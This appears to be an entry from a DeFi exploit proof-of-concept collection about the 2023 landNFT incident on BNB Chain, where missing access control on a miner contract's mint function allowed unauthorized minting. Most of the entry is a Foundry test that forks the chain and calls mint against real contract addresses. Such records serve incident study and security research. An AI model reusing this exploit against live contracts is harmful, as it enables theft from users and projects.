# [?] landNFT - Lack of permission control

## Summary
Severity: Unknown
Chain: BNB Chain
Component: landNFT
Published: 2023-05-14
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/landNFT_exp.sol
Type: defi-exploit-poc

## Details
Lost: 149,616 $BUSD
References:
- https://twitter.com/BeosinAlert/status/1658000784943124480?cxt=HHwWgMDU_b27s4IuAAAA
- https://twitter.com/BeosinAlert/status/1658002030953365505?cxt=HHwWgoDQvYGEtIIuAAAA

```solidity
contract ContractTest is Test {
    IERC721 landNFT = IERC721(0x1a62fe088F46561bE92BB5F6e83266289b94C154);
    IMiner minerContract = IMiner(0x2e599883715D2f92468Fa5ae3F9aab4E930E3aC7);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_208_132);
        cheats.label(address(landNFT), "landNFT");
        cheats.label(address(minerContract), "Miner");
    }

    function testExploit() public {
        emit log_named_uint("Attacker amount of NFT land before mint", landNFT.balanceOf(address(this)));

        address[] memory to = new address[](1);
        to[0] = address(this);
        uint256[] memory amount = new uint256[](1);
        amount[0] = 200;
        minerContract.mint(to, amount);

        emit log_named_uint("Attacker amount of NFT land after mint", landNFT.balanceOf(address(this)));
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
```
